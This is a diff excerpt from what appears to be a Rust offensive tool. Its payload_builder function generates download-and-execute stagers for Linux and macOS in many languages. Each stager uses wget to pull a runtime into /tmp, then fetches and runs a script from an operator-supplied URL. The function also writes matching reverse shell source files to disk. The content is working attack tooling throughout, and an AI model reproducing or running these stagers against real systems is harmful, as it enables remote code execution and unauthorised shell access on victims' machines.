+        let fsharp_payload = format!("wget {} -O /tmp/dotnet-sdk-8.0.204-linux-x64.tar.gz;tar xzvf /tmp/dotnet-sdk-8.0.204-linux-x64.tar.gz -C /tmp;chmod +x /tmp/dotnet;wget {}/{}.fsx -O /tmp/{}.fsx;/tmp/dotnet/dotnet fsi /tmp/{}.fsx", &get_lang_dl("fsharp", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let deno_payload = format!("wget {} -O /tmp/deno-x86_64-unknown-linux-gnu.zip;unzip /tmp/deno-x86_64-unknown-linux-gnu.zip -d /tmp/deno-x86_64-unknown-linux-gnu/;chmod +x /tmp/deno-x86_64-unknown-linux-gnu/deno;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/deno-x86_64-unknown-linux-gnu/deno run --allow-net --allow-run /tmp/{}.ts", &get_lang_dl("deno", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
         let nix_payloads = payloads::Payloads::new(
             &tcl_payload,
             &php_payload,
@@ -294,150 +340,129 @@ pub fn payload_builder(platform: &str, language: &str, payload: &str, output: &s
         );
         let p_res = if language == "tcl" {
             nix_payloads.tcl_payload()
-        }
-        else if language == "php" {
+        } else if language == "php" {
             nix_payloads.php_payload()
-        }
-        else if language == "crystal" {
+        } else if language == "crystal" {
             nix_payloads.crystal_payload()
-        }
-        else if language == "julia" {
+        } else if language == "julia" {
             nix_payloads.julia_payload()
-        }
-        else if language == "golang" {
+        } else if language == "golang" {
             nix_payloads.go_payload()
-        }
-        else if language == "dart" {
+        } else if language == "dart" {
             nix_payloads.dart_payload()
-        }
-        else if language == "dlang" {
+        } else if language == "dlang" {
             nix_payloads.d_payload()
-        }
-        else if language == "vlang" {
+        } else if language == "vlang" {
             nix_payloads.v_payload()
-        }
-        else if language == "nodejs" {
+        } else if language == "nodejs" {
             nix_payloads.node_payload()
-        }
-        else if language == "bun" {
+        } else if language == "bun" {
             nix_payloads.bun_payload()
-        }
-        else if language == "python" {
+        } else if language == "python" {
             nix_payloads.python_payload()
-        }
-        else if language == "fsharp" {
+        } else if language == "fsharp" {
             nix_payloads.fsharp_payload()
-        }
-        else if language == "deno" {
+        } else if language == "deno" {
             nix_payloads.deno_payload()
-        }
-        else if language == "empty" {
+        } else if language == "empty" {
             "Building payload for every language...".to_string()
-        }
-        else {
+        } else {
             arguments::getargs()
-        }.to_string();
+        }
+        .to_string();
 
         let p_shell = if language == "tcl" {
             reverse_shell.tcl_revshell()
-        }else if language == "php" {
+        } else if language == "php" {
             reverse_shell.php_revshell()
-        }
-        else if language == "crystal" {
+        } else if language == "crystal" {
             reverse_shell.crystal_revshell()
-        }
-        else if language == "julia" {
+        } else if language == "julia" {
             reverse_shell.julia_revshell()
-        }
-        else if language == "golang" {
+        } else if language == "golang" {
             reverse_shell.go_revshell()
-        }
-        else if language == "dart" {
+        } else if language == "dart" {
             reverse_shell.dart_revshell()
-        }
-        else if language == "dlang" {
+        } else if language == "dlang" {
             reverse_shell.d_revshell()
-        }
-        else if language == "vlang" {
+        } else if language == "vlang" {
             reverse_shell.v_revshell()
-        }
-        else if language == "nodejs" {
+        } else if language == "nodejs" {
             reverse_shell.node_revshell()
-        }
-        else if language == "bun" {
+        } else if language == "bun" {
             reverse_shell.bun_revshell()
-        }
-        else if language == "python" {
+        } else if language == "python" {
             reverse_shell.python_revshell()
-        }
-        else if language == "fsharp" {
+        } else if language == "fsharp" {
             reverse_shell.f_revshell()
-        }
-        else if language == "deno" {
+        } else if language == "deno" {
             reverse_shell.deno_revshell()
-        }
-        else if language == "empty" {
+        } else if language == "empty" {
             "Building payload for every language...".to_string()
-        }
-        else {
+        } else {
             arguments::getargs()
-        }.to_string();
+        }
+        .to_string();
 
         let p_ext = if language == "tcl" {
             ".tcl".to_string()
-        }
-        else if language == "php" {
+        } else if language == "php" {
             ".php".to_string()
-        }
-        else if language == "crystal" {
+        } else if language == "crystal" {
             ".cr".to_string()
-        }
-        else if language == "julia" {
+        } else if language == "julia" {
             ".jl".to_string()
-        }
-        else if language == "golang" {
+        } else if language == "golang" {
             ".go".to_string()
-        }
-        else if language == "dart" {
+        } else if language == "dart" {
             ".dart".to_string()
-        }
-        else if language == "dlang" {
+        } else if language == "dlang" {
             ".d".to_string()
-        }
-        else if language == "vlang" {
+        } else if language == "vlang" {
             ".v".to_string()
-        }
-        else if language == "nodejs" {
+        } else if language == "nodejs" {
             ".js".to_string()
-        }
-        else if language == "bun" {
+        } else if language == "bun" {
             ".tsx".to_string()
-        }
-        else if language == "python" {
+        } else if language == "python" {
             ".py".to_string()
-        }
-        else if language == "fsharp" {
+        } else if language == "fsharp" {
             ".fsx".to_string()
-        } 
-        else if language == "deno" {
+        } else if language == "deno" {
             ".ts".to_string()
-        }
-        else if language == "empty" {
+        } else if language == "empty" {
             "Building payload for every language...".to_string()
-        }
-        else {
+        } else {
             arguments::getargs()
-        }.to_string();
+        }
+        .to_string();
 
         let ext = if payload == "pwsh" || payload == "PowerShell" || payload == "powershell" {
             ".ps1"
         } else {
             ".sh"
-        }.to_string();
-        let outfile = output.to_string()+&ext;
-        let revfile = output.to_string()+&p_ext;
+        }
+        .to_string();
+        let outfile = output.to_string() + &ext;
+        let revfile = output.to_string() + &p_ext;
         if allarg == "true" {
-            for payload in [ &nix_payloads.tcl_payload(), &nix_payloads.php_payload(), &nix_payloads.crystal_payload(), &nix_payloads.julia_payload(), &nix_payloads.go_payload(), &nix_payloads.dart_payload(), &nix_payloads.d_payload(), &nix_payloads.v_payload(), &nix_payloads.node_payload(), &nix_payloads.bun_payload(), &nix_payloads.python_payload(), &nix_payloads.fsharp_payload(), &nix_payloads.deno_payload()].iter() {
+            for payload in [
+                &nix_payloads.tcl_payload(),
+                &nix_payloads.php_payload(),
+                &nix_payloads.crystal_payload(),
+                &nix_payloads.julia_payload(),
+                &nix_payloads.go_payload(),
+                &nix_payloads.dart_payload(),
+                &nix_payloads.d_payload(),
+                &nix_payloads.v_payload(),
+                &nix_payloads.node_payload(),
+                &nix_payloads.bun_payload(),
+                &nix_payloads.python_payload(),
+                &nix_payloads.fsharp_payload(),
+                &nix_payloads.deno_payload(),
+            ]
+            .iter()
+            {
                 //println!("{}", payload);
                 // Open a file with append option
                 let mut data_file = OpenOptions::new()
@@ -451,34 +476,71 @@ pub fn payload_builder(platform: &str, language: &str, payload: &str, output: &s
                     .write_all(payload.as_bytes())
                     .expect("write failed");
             }
-            let source_array = [ &reverse_shell.tcl_revshell(), &reverse_shell.php_revshell(), &reverse_shell.crystal_revshell(), &reverse_shell.julia_revshell(), &reverse_shell.go_revshell(), &reverse_shell.dart_revshell(), &reverse_shell.d_revshell(), &reverse_shell.v_revshell(), &reverse_shell.node_revshell(), &reverse_shell.bun_revshell(), &reverse_shell.python_revshell(), &reverse_shell.f_revshell(), &reverse_shell.deno_revshell()];
-            let ext_array = [".tcl".to_string(), ".php".to_string(), ".cr".to_string(), ".jl".to_string(), ".go".to_string(), ".dart".to_string(), ".d".to_string(), ".v".to_string(), ".js".to_string(), ".tsx".to_string(), ".py".to_string(), ".fsx".to_string(), ".ts".to_string()];
+            let source_array = [
+                &reverse_shell.tcl_revshell(),
+                &reverse_shell.php_revshell(),
+                &reverse_shell.crystal_revshell(),
+                &reverse_shell.julia_revshell(),
+                &reverse_shell.go_revshell(),
+                &reverse_shell.dart_revshell(),
+                &reverse_shell.d_revshell(),
+                &reverse_shell.v_revshell(),
+                &reverse_shell.node_revshell(),
+                &reverse_shell.bun_revshell(),
+                &reverse_shell.python_revshell(),
+                &reverse_shell.f_revshell(),
+                &reverse_shell.deno_revshell(),
+            ];
+            let ext_array = [
+                ".tcl".to_string(),
+                ".php".to_string(),
+                ".cr".to_string(),
+                ".jl".to_string(),
+                ".go".to_string(),
+                ".dart".to_string(),
+                ".d".to_string(),
+                ".v".to_string(),
+                ".js".to_string(),
+                ".tsx".to_string(),
+                ".py".to_string(),
+                ".fsx".to_string(),
+                ".ts".to_string(),
+            ];
             for (revcode, revext) in source_array.iter().zip(ext_array.iter()) {
-                let payloadfile = output.to_string()+&revext;
-                let mut revshell_source = std::fs::File::create(payloadfile).expect("create failed");
-                revshell_source.write_all(revcode.as_bytes()).expect("write failed");
+                let payloadfile = output.to_string() + &revext;
+                let mut revshell_source =
+                    std::fs::File::create(payloadfile).expect("create failed");
+                revshell_source
+                    .write_all(revcode.as_bytes())
+                    .expect("write failed");
             }
-
         } else {
             let mut payload_main = std::fs::File::create(outfile).expect("create failed");
-            payload_main.write_all(p_res.as_bytes()).expect("write failed");
+            payload_main
+                .write_all(p_res.as_bytes())
+                .expect("write failed");
             let mut revshell_source = std::fs::File::create(revfile).expect("create failed");
-            revshell_source.write_all(p_shell.as_bytes()).expect("write failed");
+            revshell_source
+                .write_all(p_shell.as_bytes())
+                .expect("write failed");
         }
     } else if platform == "macos" {
-        let tcl_payload = format!("wget https://tclkits.rkeene.org/fossil/raw/tclkit-8.6.3-macosx10.5-ix86+x86_64?name=1b4a7ae47ebab6ea9e0e16af4d8714c8b4aa0ce2 -O /tmp/tclkit8;chmod +x /tmp/tclkit8;wget {}/{}.tcl -O /tmp/{}.tcl;/tmp/tclkit8 /tmp/{}.tcl", &urlarg, &output, &output, &output);
-        let php_payload = format!("wget https://dl.static-php.dev/static-php-cli/common/php-8.3.6-cli-macos-x86_64.tar.gz -O /tmp/php8.tar.gz;tar xzvf /tmp/php8.tar.gz -C /tmp;chmod +x /tmp/php;wget {}/{}.php -O /tmp/{}.php;/tmp/php /tmp/{}.php", &urlarg, &output, &output, &output);
-        let crystal_payload = format!("wget https://github.com/crystal-lang/crystal/releases/download/1.12.1/crystal-1.12.1-1-darwin-universal.tar.gz -O /tmp/crystal.tar.gz;tar xzvf /tmp/crystal.tar.gz -C /tmp;chmod +x /tmp/crystal-1.12.1-1/bin/crystal;wget {}/{}.cr -O /tmp/{}.cr;/tmp/crystal-1.12.1-1/bin/crystal run /tmp/{}.cr", &urlarg, &output, &output, &output);
-        let julia_payload = format!("wget https://julialang-s3.julialang.org/bin/mac/x64/1.10/julia-1.10.3-mac64.tar.gz -O /tmp/julia.tar.gz;tar xzvf /tmp/julia.tar.gz -C /tmp;chmod +x /tmp/julia-1.10.3/bin/julia;wget {}/{}.jl -O /tmp/{}.jl;/tmp/julia-1.10.3/bin/julia /tmp/{}.jl", &urlarg, &output, &output, &output);
-        let go_payload = format!("wget https://go.dev/dl/go1.22.3.darwin-arm64.tar.gz -O /tmp/go.tar.gz;tar xzvf /tmp/go.tar.gz -C /tmp;chmod +x /tmp/go/bin/go;wget {}/{}.go -O /tmp/{}.go;/tmp/go/bin/go run /tmp/{}.go", &urlarg, &output, &output, &output);
-        let dart_payload = format!("wget https://storage.googleapis.com/dart-archive/channels/stable/release/3.3.4/sdk/dartsdk-macos-x64-release.zip -O /tmp/dart.zip;unzip /tmp/dart.zip -d /tmp/dart-sdk/;chmod +x /tmp/dart-sdk/bin/dart;wget {}/{}.dart -O /tmp/{}.dart;/tmp/dart-sdk/bin/dart /tmp/{}.dart", &urlarg, &output, &output, &output);
-        let d_payload = format!("wget https://downloads.dlang.org/releases/2.x/2.108.1/dmd.2.108.1.osx.zip -O /tmp/dmd.zip;unzip /tmp/dmd.zip -d /tmp/dmd2/;chmod +x /tmp/dmd2/osx/bin/dmd;wget {}/{}.d -O /tmp/{}.d;/tmp/dmd2/osx/bin/dmd /tmp/{}.d", &urlarg, &output, &output, &output);
-        let v_payload = format!("wget https://github.com/vlang/v/releases/download/weekly.2024.19/v_macos_x86_64.zip -O /tmp/v_macos_x86_64.zip;unzip /tmp/v_macos_x86_64.zip -d /tmp/v/;chmod +x /tmp/v/v;wget {}/{}.v -O /tmp/{}.v;/tmp/v/v /tmp/{}.v", &urlarg, &output, &output, &output);
-        let node_payload = format!("wget https://nodejs.org/dist/v20.12.2/node-v20.12.2-darwin-x64.tar.gz -O /tmp/node-v20.12.2-darwin-x64.tar.gz;tar xzvf /tmp/node-v20.12.2-darwin-x64.tar.gz -C /tmp;chmod +x /tmp/node-v20.12.2-darwin-x64/bin/node;wget {}/{}.js -O /tmp/{}.js;/tmp/node-v20.12.2-darwin-x64/bin/node /tmp/{}.js", &urlarg, &output, &output, &output);
-        let bun_payload = format!("wget https://github.com/oven-sh/bun/releases/download/bun-v1.1.18/bun-darwin-x64.zip -O /tmp/bun.zip;unzip /tmp/bun.zip -d /tmp/bun-linux-x64/;chmod +x /tmp/bun-linux-x64/bun;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/bun-linux-x64/bun /tmp/{}.tsx", &urlarg, &output, &output, &output);
-        let python_payload = format!("wget {}/{}.py -O /tmp/{}.py;python3 /tmp/{}.py", &urlarg, &output, &output, &output);
-        let fsharp_payload = format!("wget https://download.visualstudio.microsoft.com/download/pr/9548c95b-8495-4b69-b6f0-1fdebdbbf9ff/30827786409718c5a9604711661da3b5/dotnet-sdk-8.0.204-osx-x64.tar.gz -O /tmp/dotnet-sdk-8.0.204-osx-x64.tar.gz;tar xzvf /tmp/dotnet-sdk-8.0.204-osx-x64.tar.gz -C /tmp;chmod +x /tmp/dotnet/dotnet;wget {}/{}.fsx -O /tmp/{}.fsx;/tmp/dotnet fsi /tmp/{}.fsx", &urlarg, &output, &output, &output);
-        let deno_payload = format!("wget https://github.com/denoland/deno/releases/download/v1.45.1/deno-x86_64-apple-darwin.zip -O /tmp/deno-x86_64-apple-darwin.zip;unzip /tmp/deno-x86_64-apple-darwin.zip -d /tmp/deno-x86_64-apple-darwin/;chmod +x /tmp/deno-x86_64-apple-darwin/deno;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/deno-x86_64-apple-darwin/deno run --allow-net --allow-run /tmp/{}.ts", &urlarg, &output, &output, &output);
+        let tcl_payload = format!("wget {} -O /tmp/tclkit8;chmod +x /tmp/tclkit8;wget {}/{}.tcl -O /tmp/{}.tcl;/tmp/tclkit8 /tmp/{}.tcl", &get_lang_dl("tcl", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let php_payload = format!("wget {} -O /tmp/php8.tar.gz;tar xzvf /tmp/php8.tar.gz -C /tmp;chmod +x /tmp/php;wget {}/{}.php -O /tmp/{}.php;/tmp/php /tmp/{}.php", &get_lang_dl("php", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let crystal_payload = format!("wget {} -O /tmp/crystal.tar.gz;tar xzvf /tmp/crystal.tar.gz -C /tmp;chmod +x /tmp/crystal-1.12.1-1/bin/crystal;wget {}/{}.cr -O /tmp/{}.cr;/tmp/crystal-1.12.1-1/bin/crystal run /tmp/{}.cr", &get_lang_dl("crystal", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let julia_payload = format!("wget {} -O /tmp/julia.tar.gz;tar xzvf /tmp/julia.tar.gz -C /tmp;chmod +x /tmp/julia-1.10.3/bin/julia;wget {}/{}.jl -O /tmp/{}.jl;/tmp/julia-1.10.3/bin/julia /tmp/{}.jl", &get_lang_dl("julia", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let go_payload = format!("wget {} -O /tmp/go.tar.gz;tar xzvf /tmp/go.tar.gz -C /tmp;chmod +x /tmp/go/bin/go;wget {}/{}.go -O /tmp/{}.go;/tmp/go/bin/go run /tmp/{}.go", &get_lang_dl("golang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let dart_payload = format!("wget {} -O /tmp/dart.zip;unzip /tmp/dart.zip -d /tmp/dart-sdk/;chmod +x /tmp/dart-sdk/bin/dart;wget {}/{}.dart -O /tmp/{}.dart;/tmp/dart-sdk/bin/dart /tmp/{}.dart", &get_lang_dl("dart", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let d_payload = format!("wget {} -O /tmp/dmd.zip;unzip /tmp/dmd.zip -d /tmp/dmd2/;chmod +x /tmp/dmd2/osx/bin/dmd;wget {}/{}.d -O /tmp/{}.d;/tmp/dmd2/osx/bin/dmd /tmp/{}.d", &get_lang_dl("dlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let v_payload = format!("wget {} -O /tmp/v_macos_x86_64.zip;unzip /tmp/v_macos_x86_64.zip -d /tmp/v/;chmod +x /tmp/v/v;wget {}/{}.v -O /tmp/{}.v;/tmp/v/v /tmp/{}.v", &get_lang_dl("vlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let node_payload = format!("wget {} -O /tmp/node-v20.12.2-darwin-x64.tar.gz;tar xzvf /tmp/node-v20.12.2-darwin-x64.tar.gz -C /tmp;chmod +x /tmp/node-v20.12.2-darwin-x64/bin/node;wget {}/{}.js -O /tmp/{}.js;/tmp/node-v20.12.2-darwin-x64/bin/node /tmp/{}.js", &get_lang_dl("nodejs", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let bun_payload = format!("wget {} -O /tmp/bun.zip;unzip /tmp/bun.zip -d /tmp/bun-linux-x64/;chmod +x /tmp/bun-linux-x64/bun;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/bun-linux-x64/bun /tmp/{}.tsx", &get_lang_dl("bun", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let python_payload = format!(
+            "wget {}/{}.py -O /tmp/{}.py;python3 /tmp/{}.py",
+            &urlarg, &output, &output, &output
+        );
+        let fsharp_payload = format!("wget {} -O /tmp/dotnet-sdk-8.0.204-osx-x64.tar.gz;tar xzvf /tmp/dotnet-sdk-8.0.204-osx-x64.tar.gz -C /tmp;chmod +x /tmp/dotnet/dotnet;wget {}/{}.fsx -O /tmp/{}.fsx;/tmp/dotnet fsi /tmp/{}.fsx", &get_lang_dl("fsharp", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let deno_payload = format!("wget {} -O /tmp/deno-x86_64-apple-darwin.zip;unzip /tmp/deno-x86_64-apple-darwin.zip -d /tmp/deno-x86_64-apple-darwin/;chmod +x /tmp/deno-x86_64-apple-darwin/deno;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/deno-x86_64-apple-darwin/deno run --allow-net --allow-run /tmp/{}.ts", &get_lang_dl("deno", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
         let mac_payloads = payloads::Payloads::new(
             &tcl_payload,
             &php_payload,
@@ -524,150 +586,129 @@ pub fn payload_builder(platform: &str, language: &str, payload: &str, output: &s
         );
         let p_res = if language == "tcl" {
             mac_payloads.tcl_payload()
-        }
-        else if language == "php" {
+        } else if language == "php" {
             mac_payloads.php_payload()
-        }
-        else if language == "crystal" {
+        } else if language == "crystal" {
             mac_payloads.crystal_payload()
-        }
-        else if language == "julia" {
+        } else if language == "julia" {
             mac_payloads.julia_payload()
-        }
-        else if language == "golang" {
+        } else if language == "golang" {
             mac_payloads.go_payload()
-        }
-        else if language == "dart" {
+        } else if language == "dart" {
             mac_payloads.dart_payload()
-        }
-        else if language == "dlang" {
+        } else if language == "dlang" {
             mac_payloads.d_payload()
-        }
-        else if language == "vlang" {
+        } else if language == "vlang" {
             mac_payloads.v_payload()
-        }
-        else if language == "nodejs" {
+        } else if language == "nodejs" {
             mac_payloads.node_payload()
-        }
-        else if language == "bun" {
+        } else if language == "bun" {
             mac_payloads.bun_payload()
-        }
-        else if language == "python" {
+        } else if language == "python" {
             mac_payloads.python_payload()
-        }
-        else if language == "fsharp" {
+        } else if language == "fsharp" {
             mac_payloads.fsharp_payload()
-        }
-        else if language == "deno" {
+        } else if language == "deno" {
             mac_payloads.deno_payload()
-        }
-        else if language == "empty" {
+        } else if language == "empty" {
             "Building payload for every language...".to_string()
-        }
-        else {
+        } else {
             arguments::getargs()
-        }.to_string();
+        }
+        .to_string();
 
         let p_shell = if language == "tcl" {
             reverse_shell.tcl_revshell()
-        }else if language == "php" {
+        } else if language == "php" {
             reverse_shell.php_revshell()
-        }
-        else if language == "crystal" {
+        } else if language == "crystal" {
             reverse_shell.crystal_revshell()
-        }
-        else if language == "julia" {
+        } else if language == "julia" {
             reverse_shell.julia_revshell()
-        }
-        else if language == "golang" {
+        } else if language == "golang" {
             reverse_shell.go_revshell()
-        }
-        else if language == "dart" {
+        } else if language == "dart" {
             reverse_shell.dart_revshell()
-        }
-        else if language == "dlang" {
+        } else if language == "dlang" {
             reverse_shell.d_revshell()
-        }
-        else if language == "vlang" {
+        } else if language == "vlang" {
             reverse_shell.v_revshell()
-        }
-        else if language == "nodejs" {
+        } else if language == "nodejs" {
             reverse_shell.node_revshell()
-        }
-        else if language == "bun" {
+        } else if language == "bun" {
             reverse_shell.bun_revshell()
-        }
-        else if language == "python" {
+        } else if language == "python" {
             reverse_shell.python_revshell()
-        }
-        else if language == "fsharp" {
+        } else if language == "fsharp" {
             reverse_shell.f_revshell()
-        }
-        else if language == "dano" {
+        } else if language == "dano" {
             reverse_shell.deno_revshell()
-        }
-        else if language == "empty" {
+        } else if language == "empty" {
             "Building payload for every language...".to_string()
-        }
-        else {
+        } else {
             arguments::getargs()
-        }.to_string();
+        }
+        .to_string();
 
         let p_ext = if language == "tcl" {
             ".tcl".to_string()
-        }
-        else if language == "php" {
+        } else if language == "php" {
             ".php".to_string()
-        }
-        else if language == "crystal" {
+        } else if language == "crystal" {
             ".cr".to_string()
-        }
-        else if language == "julia" {
+        } else if language == "julia" {
             ".jl".to_string()
-        }
-        else if language == "golang" {
+        } else if language == "golang" {
             ".go".to_string()
-        }
-        else if language == "dart" {
+        } else if language == "dart" {
             ".dart".to_string()
-        }
-        else if language == "dlang" {
+        } else if language == "dlang" {
             ".d".to_string()
-        }
-        else if language == "vlang" {
+        } else if language == "vlang" {
             ".v".to_string()
-        }
-        else if language == "nodejs" {
+        } else if language == "nodejs" {
             ".js".to_string()
-        }
-        else if language == "bun" {
+        } else if language == "bun" {
             ".tsx".to_string()
-        }
-        else if language == "python" {
+        } else if language == "python" {
             ".py".to_string()
-        }
-        else if language == "fsharp" {
+        } else if language == "fsharp" {
             ".fsx".to_string()
-        }
-        else if language == "deno" {
+        } else if language == "deno" {
             ".ts".to_string()
-        }
-        else if language == "empty" {
+        } else if language == "empty" {
             "Building payload for every language...".to_string()
-        }
-        else {
+        } else {
             arguments::getargs()
-        }.to_string();
+        }
+        .to_string();
 
         let ext = if payload == "pwsh" || payload == "PowerShell" || payload == "powershell" {
             ".ps1"
         } else {
             ".sh"
-        }.to_string();
-        let outfile = output.to_string()+&ext;
-        let revfile = output.to_string()+&p_ext;
+        }
+        .to_string();
+        let outfile = output.to_string() + &ext;
+        let revfile = output.to_string() + &p_ext;
         if allarg == "true" {
-            for payload in [ &mac_payloads.tcl_payload(), &mac_payloads.php_payload(), &mac_payloads.crystal_payload(), &mac_payloads.julia_payload(), &mac_payloads.go_payload(), &mac_payloads.dart_payload(), &mac_payloads.d_payload(), &mac_payloads.v_payload(), &mac_payloads.node_payload(), &mac_payloads.bun_payload(), &mac_payloads.python_payload(), &mac_payloads.fsharp_payload(), &mac_payloads.deno_payload()].iter() {
+            for payload in [
+                &mac_payloads.tcl_payload(),
+                &mac_payloads.php_payload(),
+                &mac_payloads.crystal_payload(),
+                &mac_payloads.julia_payload(),
+                &mac_payloads.go_payload(),
+                &mac_payloads.dart_payload(),
+                &mac_payloads.d_payload(),
+                &mac_payloads.v_payload(),
+                &mac_payloads.node_payload(),
+                &mac_payloads.bun_payload(),
+                &mac_payloads.python_payload(),
+                &mac_payloads.fsharp_payload(),
+                &mac_payloads.deno_payload(),
+            ]
+            .iter()
+            {
                 //println!("{}", payload);
                 // Open a file with append option
                 let mut data_file = OpenOptions::new()
@@ -681,20 +722,54 @@ pub fn payload_builder(platform: &str, language: &str, payload: &str, output: &s
                     .write_all(payload.as_bytes())
                     .expect("write failed");
             }
-            let source_array = [ &reverse_shell.tcl_revshell(), &reverse_shell.php_revshell(), &reverse_shell.crystal_revshell(), &reverse_shell.julia_revshell(), &reverse_shell.go_revshell(), &reverse_shell.dart_revshell(), &reverse_shell.d_revshell(), &reverse_shell.v_revshell(), &reverse_shell.node_revshell(), &reverse_shell.bun_revshell(), &reverse_shell.python_revshell(), &reverse_shell.f_revshell(), &reverse_shell.deno_revshell()];
-            let ext_array = [".tcl".to_string(), ".php".to_string(), ".cr".to_string(), ".jl".to_string(), ".go".to_string(), ".dart".to_string(), ".d".to_string(), ".v".to_string(), ".js".to_string(), ".tsx".to_string(), ".py".to_string(), ".fsx".to_string(), ".ts".to_string()];
+            let source_array = [
+                &reverse_shell.tcl_revshell(),
+                &reverse_shell.php_revshell(),
+                &reverse_shell.crystal_revshell(),
+                &reverse_shell.julia_revshell(),
+                &reverse_shell.go_revshell(),
+                &reverse_shell.dart_revshell(),
+                &reverse_shell.d_revshell(),
+                &reverse_shell.v_revshell(),
+                &reverse_shell.node_revshell(),
+                &reverse_shell.bun_revshell(),
+                &reverse_shell.python_revshell(),
+                &reverse_shell.f_revshell(),
+                &reverse_shell.deno_revshell(),
+            ];
+            let ext_array = [
+                ".tcl".to_string(),
+                ".php".to_string(),
+                ".cr".to_string(),
+                ".jl".to_string(),
+                ".go".to_string(),
+                ".dart".to_string(),
+                ".d".to_string(),
+                ".v".to_string(),
+                ".js".to_string(),
+                ".tsx".to_string(),
+                ".py".to_string(),
+                ".fsx".to_string(),
+                ".ts".to_string(),
+            ];
             for (revcode, revext) in source_array.iter().zip(ext_array.iter()) {
-                let payloadfile = output.to_string()+&revext;
-                let mut revshell_source = std::fs::File::create(payloadfile).expect("create failed");
-                revshell_source.write_all(revcode.as_bytes()).expect("write failed");
+                let payloadfile = output.to_string() + &revext;
+                let mut revshell_source =
+                    std::fs::File::create(payloadfile).expect("create failed");
+                revshell_source
+                    .write_all(revcode.as_bytes())
+                    .expect("write failed");
             }
-
         } else {
             println!("{}", outfile);
             let mut payload_main = std::fs::File::create(outfile).expect("create failed");
-            payload_main.write_all(p_res.as_bytes()).expect("write failed");
+            payload_main
+                .write_all(p_res.as_bytes())
+                .expect("write failed");
             let mut revshell_source = std::fs::File::create(revfile).expect("create failed");
-            revshell_source.write_all(p_shell.as_bytes()).expect("write failed");
+            revshell_source
+                .write_all(p_shell.as_bytes())
+                .expect("write failed");
         }
     } else {
         arguments::getargs();
